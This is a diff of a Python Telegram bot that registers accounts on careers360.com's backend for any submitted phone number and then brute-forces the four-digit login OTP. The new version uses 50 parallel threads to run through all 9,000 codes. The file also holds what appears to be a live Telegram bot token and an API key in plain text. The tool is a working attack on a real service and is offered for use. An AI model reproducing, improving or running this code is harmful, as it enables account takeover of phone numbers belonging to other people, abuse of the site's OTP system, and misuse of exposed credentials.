@@ -1,30 +1,15 @@
 import requests
+import time
 import asyncio
-import random
-import logging
-import threading
-import nest_asyncio
+import concurrent.futures
 from flask import Flask
+from fastapi import FastAPI
+import uvicorn
 from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, MessageHandler, filters, ContextTypes
 
-# Apply nest_asyncio to fix event loop issues
-nest_asyncio.apply()
+BOT_TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
 
-# Flask server for Koyeb
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def home():
-    return "Bot is running successfully!"
-
-# Setup logging
-logging.basicConfig(level=logging.INFO)
-
-# Telegram Bot Token
-TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
-
-# API Headers
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
     "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
@@ -34,26 +19,25 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-# Random links
-ASK_ME_LINKS = [
-    "ebooks/jee-main-preparation-tips-complete-strategy-study-plan",
-    "ebooks/jee-main-highest-scoring-chapters-and-topics"
-]
+# Flask app for Koyeb deployment
+flask_app = Flask(__name__)
 
-# Command: /op to start the login process
-async def op(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Send details in `{number} - {Name} - {email}` format.")
+# FastAPI for handling OTP brute-force in async
+fastapi_app = FastAPI()
 
-# Handling user input
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_input = update.message.text.strip()
+async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    message = update.message.text
+    chat_id = update.message.chat_id
+
     try:
-        mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
+        ask_me, mobile_number, ask_name, ask_email = map(str.strip, message.split(" - "))
     except ValueError:
-        await update.message.reply_text("❌ Invalid format! Use `{number} - {Name} - {email}`")
+        await update.message.reply_text("❌ Invalid format! Use: `book-name - number - name - email`", parse_mode="Markdown")
         return
 
-    ask_me = random.choice(ASK_ME_LINKS)
+    bot = context.bot
+
+    # Send OTP
     otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
     otp_data = {
         "otp_on": "mobile",
@@ -63,44 +47,53 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "mobile_number": mobile_number
     }
 
-    msg = await update.message.reply_text("Otp Sent - 👍")
-
     otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
     if otp_response.status_code == 200 and otp_response.json().get("result"):
-        await msg.edit_text("Signup Successful - 👍")
+        sent_message = await bot.send_message(chat_id, "✅ OTP Sent Successfully! 📩")
+        time.sleep(2)
+        await bot.delete_message(chat_id, sent_message.message_id)
     else:
-        await msg.edit_text("❌ OTP Sending Failed.")
+        await bot.send_message(chat_id, "❌ OTP Sending Failed.")
         return
 
-    # Signup request
+    # Signup
     signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
     signup_data = {
-        "current_url": f"https://engineering.careers360.com/download/{ask_me}",
-        "destination": f"https://engineering.careers360.com/download/{ask_me}",
+        "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
+        "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
         "cta_clicked": "signup",
         "country_code": "+91",
         "mobile_number": mobile_number,
-        "email": user_email,
-        "name": user_name,
+        "email": ask_email,
+        "name": ask_name,
         "submit": True
     }
 
     signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
     if signup_response.status_code == 200 and signup_response.json().get("result"):
         user_uuid = signup_response.json()["data"].get("user_uuid")
+        uuid_message = await bot.send_message(chat_id, f"✅ Signup Successful! UUID: `{user_uuid}`", parse_mode="Markdown")
+        time.sleep(2)
+        await bot.delete_message(chat_id, uuid_message.message_id)
     else:
-        await msg.edit_text("❌ Signup failed.")
+        await bot.send_message(chat_id, "❌ Signup Failed.")
         return
 
-    # OTP Brute-force
+    # Login Brute Force OTP
     login_url = "https://backend-cus.careers360.com/api/1/cus/login"
     found_otp = None
     checked_otps = 0
 
-    for otp in range(1000, 10000):  # Checking OTPs
+    progress_message = await bot.send_message(chat_id, "🔄 Checking OTPs... (0 checked)")
+
+    def try_otp(otp):
+        nonlocal found_otp, checked_otps
+        if found_otp:
+            return None
+
         login_data = {
-            "current_url": f"https://engineering.careers360.com/download/{ask_me}",
-            "destination": f"https://engineering.careers360.com/download/{ask_me}",
+            "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
+            "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
             "otp_on": "mobile",
             "country_code": "+91",
             "mobile_number": mobile_number,
@@ -109,44 +102,51 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
 
         login_response = requests.post(login_url, json=login_data, headers=HEADERS)
+
+        checked_otps += 1  # Increment OTP count
+
         if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
             found_otp = otp
-            await msg.edit_text(f"Valid Otp - {otp}")
-            break
+            return otp
 
-        checked_otps += 1
-        if checked_otps % 100 == 0:
-            await msg.edit_text(f"Otp - Checked {checked_otps} OTPs")
+        return None
+
+    async def check_otp_with_updates():
+        nonlocal found_otp, checked_otps
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+            future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
+
+            for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
+                if found_otp:
+                    executor.shutdown(wait=False)
+                    break
+
+                # Edit the message every 500 OTPs checked
+                if checked_otps % 500 == 0:
+                    await progress_message.edit_text(f"🔄 Checking OTPs... ({checked_otps} checked)")
+
+    await check_otp_with_updates()
+    await bot.delete_message(chat_id, progress_message.message_id)
 
     if found_otp:
-        await msg.edit_text("Login Successful - 👍")
+        await bot.send_message(chat_id, f"✅ Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
     else:
-        await msg.edit_text("❌ OTP brute-force failed.")
+        await bot.send_message(chat_id, "❌ OTP brute-force failed. Could not find correct OTP.")
 
-# Function to run the Telegram bot
-def run_telegram_bot():
-    app = Application.builder().token(TOKEN).build()
-    app.add_handler(CommandHandler("op", op))
-    app.add_handler(CommandHandler("start", op))
-    app.add_handler(CommandHandler("help", op))
-    app.add_handler(CommandHandler("login", op))
-    app.add_handler(CommandHandler("signup", op))
-    app.add_handler(CommandHandler("retry", op))
-    app.add_handler(CommandHandler("status", op))
-    app.add_handler(CommandHandler("progress", op))
-    app.add_handler(CommandHandler("check", op))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+@flask_app.route('/')
+def home():
+    return "Bot is Running!"
 
-    print("Bot started successfully!")
-    app.run_polling()
+async def main():
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_login))
+    print("🤖 Bot is running...")
 
-# Start Flask server and Telegram bot
-def start_services():
-    # Start Flask server in a separate thread
-    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()
-
-    # Run Telegram bot in the main thread
-    run_telegram_bot()
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+    await asyncio.Event().wait()
 
 if __name__ == "__main__":
-    start_services()
+    asyncio.create_task(main())
+    uvicorn.run(fastapi_app, host="0.0.0.0", port=8000)
